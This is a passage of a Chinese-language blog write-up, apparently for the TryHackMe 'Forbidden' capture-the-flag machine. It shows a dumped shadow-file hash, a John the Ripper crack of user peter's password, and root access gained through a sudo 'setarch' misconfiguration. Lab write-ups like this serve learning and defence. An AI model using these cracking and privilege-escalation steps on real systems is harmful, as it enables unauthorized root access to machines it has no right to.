class="line">root:$6$8nU2FdqnxRtT9mWF$9q7El.D7BDrlzNyYYPNqjTcwsQEsC7utrzszLgbe9V.3KqYSfx2XgqjIEeToP41TJTiZQOGVsdCzIAYHw5O.51:18544:0:99999:7:::</span><br><span class="line">kali@kali [~] ➜  john x                                                                                                                     </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 2 password hashes with 2 different salts (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])</span><br><span class="line">Cost 1 (iteration count) is 5000 for all loaded hashes</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Proceeding with single, rules:Single</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class="line">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class="line">boomer           (peter)     </span><br><span class="line">Proceeding with incremental:ASCII</span><br><span class="line">1g 0:00:36:38  3/3 0.000454g/s 4190p/s 4190c/s 4190C/s bunkyood..bunkryne</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session aborted</span><br></pre></td></tr></table></figure>
+
+<p><strong>切换用户，并再次尝试手动枚举</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">peter@forbidden:~$ whoami</span><br><span class="line">whoami</span><br><span class="line">peter</span><br><span class="line">peter@forbidden:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for peter on forbidden:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User peter may run the following commands on forbidden:</span><br><span class="line">    (ALL : ALL) NOPASSWD: /usr/bin/setarch</span><br><span class="line">peter@forbidden:~$ uname -m</span><br><span class="line">uname -m</span><br><span class="line">x86_64</span><br><span class="line">peter@forbidden:~$ </span><br></pre></td></tr></table></figure>
+
+<p><strong>查阅文档，利用setarch提权</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">peter@forbidden:~$ sudo setarch x86_64 /bin/bash</span><br><span class="line">sudo setarch x86_64 /bin/bash</span><br><span class="line">root@forbidden:/home/peter# whoami</span><br><span class="line">whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p><strong>完成</strong></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">1.</span> <span class="toc-text">Forbidden</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.1.</span> <span class="toc-text">端口扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.2.</span> <span class="toc-text">80端口渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.3.</span> <span class="toc-text">ftp渗透</span></a></li><li class="toc-item toc-level-3"><a class="toc-link"><span class="toc-number">1.0.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/02/20/try-hack-me-Forbidden/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&text=try-hack-me:Forbidden"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&is_video=false&description=try-hack-me:Forbidden"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=try-hack-me:Forbidden&body=Check out this article: http://example.com/2025/02/20/try-hack-me-Forbidden/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&title=try-hack-me:Forbidden"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/02/20/try-hack-me-Forbidden/&name=try-hack-me:Forbidden&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/02/20/try-hack-me-Forbidden/&t=try-hack-me:Forbidden"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menü</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Teilen</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Nach oben</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    SunRT
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">总览</a></li>
+         
+          <li><a href="/tags/WEB-CTF/">CTF-WEB</a></li>
+         
+          <li><a href="/tags/PWN/">CTF-PWN</a></li>
+         
+          <li><a href="/tags/HACK-MY-VM/">HACK-MY-VM</a></li>
+         
+          <li><a href="/tags/try-hack-me/">TRY-HACK-ME</a></li>
+         
+          <li><a href="/tags/Vulhub">Vulhub</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"In die Zwischenablage kopiert!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Kopiert!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
